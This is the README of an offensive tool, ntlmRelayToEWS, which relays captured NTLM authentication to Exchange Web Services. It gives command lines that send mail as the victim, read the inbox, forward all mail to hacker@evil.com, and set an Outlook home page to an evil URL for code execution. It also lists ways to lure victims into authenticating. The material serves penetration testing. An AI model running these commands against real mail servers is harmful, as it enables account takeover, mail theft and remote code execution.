ntlmRelayToEWS
============

Author: Arno0x0x - [@Arno0x0x](http://twitter.com/Arno0x0x)

**ntlmRelayToEWS** is a tool for performing ntlm relay attacks on Exchange Web Services (EWS). It spawns an SMBListener on port 445 and an HTTPListener on port 80, waiting for incoming connection from the victim. Once the victim connects to one of the listeners, an NTLM negociation occurs and is relayed to the target EWS server.

Obviously this tool does **NOT** implement the whole EWS API, so only a handful of services are implemented that can be useful in some attack scenarios. I might be adding more in the future. See the 'usage' section to get an idea of which EWS calls are being implemented.

Limitations and Improvements
----------------------

**Exchange version**:
I've been testing this tool on an **Exchange Server 2010 SP2** only (*which is quite old admitedly*), so all EWS SOAP request templates, as well as the parsing of the EWS responses, are only tested for this version of Exchange.
These SOAP requests *might/should* work on a more recent version, probably not on older versions. In case those SOAP requests don't work on another version of Exchange, it should be quite easy to create the SOAP request templates to match a newer version by using the Microsoft EWS Managed API in trace mode and capture the proper SOAP requests (*that's how I did it !*).

**EWS SOAP client**:
I would have loved to use a SOAP client in order to get a proper interface for automatically create all SOAP requests based on the Exchange WSDL. I tried using '**zeep**' but I banged my head on the wall to get it working with the Exchange WSDL as it requires to download external namespaces and as such requires an internet connection. Also, with 'zeep', the use of a custom transport session requires a `Requests.session` which is not the type of HTTP(S) session we have by default with the HTTPClientRelay: it would have required either to refactor the HTTPClientRelay to use '*Requests*' (/me lazy) or to simply get zeep to create the messages with `zeep.client.create_message()` and then send it with the relayed session we already have. Or is it because I'm a lame developper ? oh well...

Prerequisites
----------------------
**ntlmRelayToEWS** requires a proper/clean install of [Impacket](https://github.com/CoreSecurity/impacket). So follow their instructions to get a working version of Impacket.

Usage
----------------------
In its current version, the tool only implements the following attacks, which are all made on behalf of the relayed user (*victim*).

Refer to the help to get useful info: `./ntlmRelayToEWS -h`. Get more debug information using the `--verbose` or `-v`flag.

**SendMail**

Send an HTML formed e-mail to a list of destinations:
`./ntlmRelayToEWS.py -t https://target.ews.server.corporate.org/EWS/exchange.asmx -r sendMail -d "user1@corporate.org,user2@corporate.com" -s Subject -m sampleMsg.html`

**getFolder**

Retrieve all items from a predefined folder (*inbox, sent items, calendar, tasks*):
`./ntlmRelayToEWS.py -t https://target.ews.server.corporate.org/EWS/exchange.asmx -r getFolder -f inbox`

**forwardRule**

Creates an evil forwarding rule that forwards all incoming message for the victim to another email address:
`./ntlmRelayToEWS.py -t https://target.ews.server.corporate.org/EWS/exchange.asmx -r forwardRule -d hacker@evil.com`

**setHomePage**

Defines a folder home page (*usually for the Inbox folder*) by specifying a URL. This technique, uncovered by SensePost/Etienne Stalmans allows for **arbitray command execution** in the victim's Outlook program be forging a specific HTML page: [Outlook Home Page – Another Ruler Vector](https://sensepost.com/blog/2017/outlook-home-page-another-ruler-vector/):
`./ntlmRelayToEWS.py -t https://target.ews.server.corporate.org/EWS/exchange.asmx -r setHomePage -f inbox -u http://path.to.evil.com/evilpage.html`

How to get the victim to give you their credentials for relaying ?
----------------------

In order to get the victim to send his credentials to ntlmRelayToEWS you can use any of the following well known methods:
  - Send the victim an e-mail with a hidden picture which 'src' attribute points to the ntlmRelayToEWS server, using either HTTP or SMB
  - Create a link file which 'icon' attribute points to the ntlmRelayToEWS using a UNC path and let victim browse a folder with this link
  - Perform LLMNR, NBNS or WPAD poisonning (*think of Responder.py or Invoke-Inveigh for instance*) to get any corresponding SMB or HTTP trafic from the victim sent to ntlmRelayToEWS
  - other ?

Credits
----------------
Based on [Impacket](https://github.com/CoreSecurity/impacket) and *ntlmrelayx* from Alberto Solino [@agsolino](https://twitter.com/agsolino).

DISCLAIMER
----------------
This tool is intended to be used in a legal and legitimate way only:
  - either on your own systems as a means of learning, of demonstrating what can be done and how, or testing your defense and detection mechanisms
  - on systems you've been officially and legitimately entitled to perform some security assessments (pentest, security audits)

Quoting Empire's authors:
*There is no way to build offensive tools useful to the legitimate infosec industry while simultaneously preventing malicious actors from abusing them.*